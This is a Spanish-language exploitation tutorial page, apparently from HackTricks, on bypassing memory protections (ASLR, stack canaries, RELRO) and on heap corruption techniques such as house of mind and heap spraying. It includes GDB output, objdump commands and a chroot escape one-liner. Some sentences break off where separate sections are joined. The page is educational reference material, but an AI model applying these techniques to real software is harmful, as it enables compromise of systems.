**`longjmp()`** permite **restaurar** el **contexto**.\
Los **registros guardados** son: `EBX, ESI, EDI, ESP, EIP, EBP`\
Lo que sucede es que EIP y ESP se pasan por la **funci√≥n `PTR_MANGLE`**, por lo que la **arquitectura vulnerable a este ataque es la misma que la anterior**.\
Son √∫tiles para la recuperaci√≥n de errores o interrupciones.\
Sin embargo, por lo que he le√≠do, los otros registros no est√°n protegidos, **as√≠ que si hay una `call ebx`, `call esi` o `call edi`** dentro de la funci√≥n que se est√° llamando, se puede tomar el control. O tambi√©n se podr√≠a modificar EBP para modificar ESP.

**VTable y VPTR en C++**

Cada clase tiene una **Vtable** que es una matriz de **punteros a m√©todos**.

Cada objeto de una **clase** tiene un **VPtr** que es un **puntero** a la matriz de su clase. El VPtr es parte del encabezado de cada objeto, por lo que si se logra una **sobrescritura** del **VPtr**, se podr√≠a **modificar** para que **apunte** a un m√©todo ficticio para que al ejecutar una funci√≥n vaya al shellcode.

## **Medidas preventivas y evasiones**

**ASLR no tan aleatorio**

PaX divide el espacio de direcciones del proceso en 3 grupos:

C√≥digo y datos iniciados y no iniciados: .text, .data y .bss ‚Äî> 16 bits de entrop√≠a en la variable delta\_exec, esta variable se inicia aleatoriamente con cada proceso y se suma a las direcciones iniciales

Memoria asignada por mmap() y bibliotecas compartidas ‚Äî> 16 bits, delta\_mmap

El stack ‚Äî> 24 bits, delta\_stack ‚Äî> Realmente 11 (del byte 10¬∫ al 20¬∫ inclusive) ‚Äî>alineado a 16 bytes ‚Äî> 524.288 posibles direcciones reales del stack

Las variables de entorno y los argumentos se desplazan menos que un b√∫fer en el stack.

**Return-into-printf**

Es una t√©cnica para convertir un desbordamiento de b√∫fer en un error de cadena de formato. Consiste en sustituir el EIP para que apunte a un printf de la funci√≥n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.

**Ataque a bibliotecas**

Las bibliotecas est√°n en una posici√≥n con 16 bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork(), el espacio de direcciones de memoria se clona en el proceso hijo y se mantiene intacto. Por lo que se puede intentar hacer un ataque de fuerza bruta a la funci√≥n usleep() de libc pas√°ndole como argumento ‚Äú16‚Äù de forma que cuando tarde m√°s de lo normal en responder se habr√° encontrado dicha funci√≥n. Sabiendo d√≥nde est√° dicha funci√≥n se puede obtener delta\_mmap y calcular las dem√°s.

La √∫nica forma de estar seguros de que el ASLR funciona es usando arquitectura de 64 bits. Ah√≠ no hay ataques de fuerza bruta.

**StackGuard y StackShield**

**StackGuard** inserta antes del EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Siguen siendo vulnerables recv(), memcpy(), read(), bcoy() y no protege el EBP

**StackShield** es m√°s elaborado que StackGuard

Guarda en una tabla (Global Return Stack) todas las direcciones EIP de vuelta de forma que el desbordamiento no cause ning√∫n da√±o. Adem√°s, se pueden comparar ambas direcciones para ver si ha habido un desbordamiento.

Tambi√©n se puede comprobar la direcci√≥n de retorno con un valor l√≠mite, as√≠ si el EIP se va a un sitio distinto del habitual como el espacio de datos se sabr√°. Pero esto se sortea con Ret-to-lib, ROPs o ret2ret.

Como se puede ver, StackShield tampoco protege las variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Se pone el canario antes del EBP. Reordena las variables locales para que los b√∫feres est√©n en las posiciones m√°s altas y as√≠ no puedan sobrescribir otras variables.

Adem√°s, realiza una copia segura de los argumentos pasados encima de la pila (encima de las vars locales) y usa estas copias como argumentos.

No puede proteger arrays de menos de 8 elementos ni b√∫feres que formen parte de una estructura del usuario.

El canario es un n√∫mero aleatorio sacado de ‚Äú/dev/urandom‚Äù o, si no, es 0xff0a0000. Se almacena en TLS (Thread Local Storage). Los hilos comparten el mismo espacio de memoria, el TLS es un √°rea que tiene variables globales o est√°ticas de cada hilo. Sin embargo, en principio estas son copiadas del proceso padre aunque el proceso hijo podr√≠a modificar estos datos sin modificar los del padre ni los de los dem√°s hijos. El problema es que si se usa fork() pero no se crea un nuevo canario, entonces todos los procesos (padre e hijos) usan el mismo canario. En i386 se almacena en gs:0x14 y en x86\_64 se almacena en fs:0x28

Esta protecci√≥n localiza funciones que tengan b√∫feres que puedan ser atacados e incluye en ellas c√≥digo al principio de la funci√≥n para colocar el canario y c√≥digo al final para comprobarlo.

La funci√≥n fork() realiza una copia exacta del proceso del padre, por eso mismo si un servidor web llama a fork() se puede hacer un ataque de fuerza bruta byte por byte hasta averiguar el canario que se est√° utilizando.

Si se usa la funci√≥n execve() despu√©s de fork(), se sobrescribe el espacio y el ataque ya no es posible. vfork() permite ejecutar el proceso hijo sin crear un duplicado hasta que el proceso hijo intentase escri
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
  0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sin relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
  0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para el binario **sin relro**, podemos ver que la direcci√≥n de entrada `got` para `fgets` es `0x404018`. Al mirar los mapeos de memoria, vemos que se encuentra entre `0x404000` y `0x405000`, lo que tiene los permisos **`rw`**, lo que significa que podemos leer y escribir en √©l. Para el binario **con relro**, vemos que la direcci√≥n de la tabla `got` para la ejecuci√≥n del binario (pie est√° habilitado, por lo que esta direcci√≥n cambiar√°) es `0x555555557fd0`. En el mapeo de memoria de ese binario, se encuentra entre `0x0000555555557000` y `0x0000555555558000`, lo que tiene el permiso de memoria **`r`**, lo que significa que solo podemos leer de √©l.

Entonces, ¬øcu√°l es el **bypass**? El bypass t√≠pico que uso es simplemente no escribir en regiones de memoria que relro hace que sean de solo lectura, y **encontrar una forma diferente de obtener la ejecuci√≥n de c√≥digo**.

Tenga en cuenta que para que esto suceda, el binario necesita conocer previamente a la ejecuci√≥n las direcciones de las funciones:

* Enlace perezoso: la direcci√≥n de una funci√≥n se busca la primera vez que se llama a la funci√≥n. Por lo tanto, la `GOT` necesita tener permisos de escritura durante la ejecuci√≥n.
* Enlazar ahora: las direcciones de las funciones se resuelven al comienzo de la ejecuci√≥n, luego se otorgan permisos de solo lectura a secciones sensibles como `.got`, `.dtors`, `.ctors`, `.dynamic`, `.jcr`. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar si un programa usa Enlazar ahora, puede hacer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando se carga un binario en memoria y se llama a una funci√≥n por primera vez, se salta a la PLT (Procedure Linkage Table), que a su vez salta a la GOT para descubrir que la entrada no ha sido resuelta. Entonces, invoca al Runtime Linker o rtfd para resolver la direcci√≥n y guardarla en la GOT. Cuando se llama a una funci√≥n, se llama a la PLT, que tiene la direcci√≥n de la GOT donde se almacena la direcci√≥n de la funci√≥n, redirigiendo el flujo all√≠ para llamar a la funci√≥n. Sin embargo, si es la primera vez que se llama a la funci√≥n, lo que hay en la GOT es la siguiente instrucci√≥n de la PLT, por lo que el flujo sigue el c√≥digo de la PLT (rtfd) y averigua la direcci√≥n de la funci√≥n, la guarda en la GOT y la llama.

Al cargar un binario en memoria, el compilador indica en qu√© offset debe situar los datos que se deben cargar cuando se corre el programa.

Lazy binding: la direcci√≥n de la funci√≥n se busca la primera vez que se invoca dicha funci√≥n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah√≠ y no haya que volver a buscarla.

Bind now: las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**. A pesar de esto, en general los programas no est√°n complicados con esas opciones, por lo que estos ataques siguen siendo posibles.

Para saber si se usa BIND NOW, se puede usar el comando **readelf -l /proc/ID_PROC/exe | grep BIND_NOW**.

Fortify Source -D\_FORTIFY\_SOURCE=1 o =2 trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci√≥n por una funci√≥n segura. Por ejemplo: char buf\[16]; strcpy(but, source); La segunda opci√≥n no permite que **%n** venga de una secci√≥n con permisos de escritura. Adem√°s, el par√°metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores.

Reemplazo de Libsafe: se activa con LD\_PRELOAD=/lib/libsafe.so.2 o ‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload. Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado (solo para x86, no para compilaciones con -fomit-frame-pointer, no compilaciones est√°ticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

ASCII Armored Address Space: consiste en cargar las librer√≠as compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning√∫n ataque, y menos en little endian.

Ret2plt: consiste en realizar un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido, se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫ byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system().

Falso EBP: para las funciones que usen el EBP como registro para apuntar a los argumentos, al modificar el EIP y apuntar a system(), se debe haber modificado el EBP tambi√©n para que apunte a una zona de memoria que tenga 2 bytes cualesquiera y despu√©s la direcci√≥n a &‚Äù/bin/sh‚Äù.

Jaulas con chroot(): debootstrap -arch=i386 hardy /home/user instala un sistema b√°sico bajo un subdirectorio espec√≠fico. Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

Instrumentaci√≥n de c√≥digo: Valgrind busca errores, Memcheck, RAD (Return Address Defender), Insure++.

Heap Overflows: Exploits b√°sicos. Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan). Si al liberar un trozo alguno de los contiguos se encuentra libre, estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado. Si se llama dos veces a free() con el mismo puntero, qued
En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaci√≥n en el trozo 2 ponemos un mont√≥n de nops y finalmente la shellcode

De esta forma se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en
bin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar√° esta direcci√≥n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:

Que se reserven dos malloc, de forma que al primero se le pueda hacer overflow despu√©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)

Que el malloc reservado al que se le da la direcci√≥n elegida por el atacante sea controlada por el atacante.

El objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le enga√±ar√° y se le dir√° que el √∫ltimo trozo de la lista (el siguiente en ofrecer) est√° en la direcci√≥n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en √©l, se le dar√° un trozo en la posici√≥n deseada y podr√° escribir en ella.

Tras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, as√≠ el trozo modificado saldr√° de unsorted bins y se introducir√≠a en su bin.

Una vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcci√≥n que queramos sobreescribir.

As√≠ el bin deber√° esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y enga√±e a bin haci√©ndole creer que el siguiente trozo est√° en la direcci√≥n falsa. Y a continuaci√≥n se dar√° el trozo que nos interesa.

Para que se ejecute la vulnerabilidad lo antes posible lo ideal ser√≠a: Reserva del trozo vulnerable, reserva del trozo que se modificar√°, se libera este trozo, se reserva un trozo m√°s grande al que se modificar√°, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tama√±o al vulnerado y se reserva un segundo trozo de igual tama√±o y este ser√° el que apunte a la direcci√≥n elegida.

Para proteger este ataque se uso la t√≠pica comprobaci√≥n de que el trozo ‚Äúno‚Äù es falso: se comprueba si bck->fd est√° apuntando a victim. Es decir, en nuestro caso si el puntero fd\* del trozo falso apuntado en el stack est√° apuntando a victim. Para sobrepasar esta protecci√≥n el atacante deber√≠a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcci√≥n adecuada la direcci√≥n de victim. Para que as√≠ parezca un trozo verdadero.

**Corrupci√≥n LargeBin**

Se necesitan los mismos requisitos que antes y alguno m√°s, adem√°s los trozos reservados deben ser mayores a 512.

El ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero adem√°s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.

Por ejemplo har√° que poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)

Adem√°s se ha introducido un parche para hacerlo a√∫n m√°s complicado.

**Heap Spraying**

B√°sicamente consiste en reservar toda la memoria posible para heaps y rellenar estos con un colch√≥n de nops acabados por una shellcode. Adem√°s, como colch√≥n se utiliza 0x0c. Pues se intentar√° saltar a la direcci√≥n 0x0c0c0c0c, y as√≠ si se sobreescribe alguna direcci√≥n a la que se vaya a llamar con este colch√≥n se saltar√° all√≠. B√°sicamente la t√°ctica es reservar lo m√°ximo posible para ver si se sobreescribe alg√∫n puntero y saltar a 0x0c0c0c0c esperando que all√≠ haya nops.

**Heap Feng Shui**

Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situar√° en uno de los huevos.

**objdump -d ejecutable** ‚Äî> Desensambla funciones\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obtiene la direcci√≥n de la funci√≥n\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar que es nuestra shellcode y obtener los OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabla de s√≠mbolos, para obtener la direcci√≥n de variables y funciones\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para obtener la direcci√≥n de funciones de librer√≠as (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtiene la direcci√≥n de puts a sobrescribir en la GOT\
**objdump -D ./exec** ‚Äî> Desensambla TODO hasta las entradas de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informaci√≥n de la funci√≥n en gdb

## Cursos interesantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Referencias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
